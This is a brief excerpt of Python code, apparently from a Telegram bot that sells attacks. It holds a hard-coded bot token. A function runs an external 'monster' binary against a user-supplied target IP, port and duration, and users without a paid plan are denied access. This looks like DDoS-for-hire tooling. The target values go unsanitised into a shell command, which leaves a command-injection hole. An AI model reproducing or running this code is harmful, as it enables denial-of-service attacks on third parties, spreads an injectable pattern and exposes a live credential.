...
TOKEN = '8079653235:AAGVlshgNglztRb2CHfJOQS6QI4jZKO4FiE'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./monster {target_ip} {target_port} {duration} 800")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: .*", parse_mode='Markdown')  # Contact owner message
            return
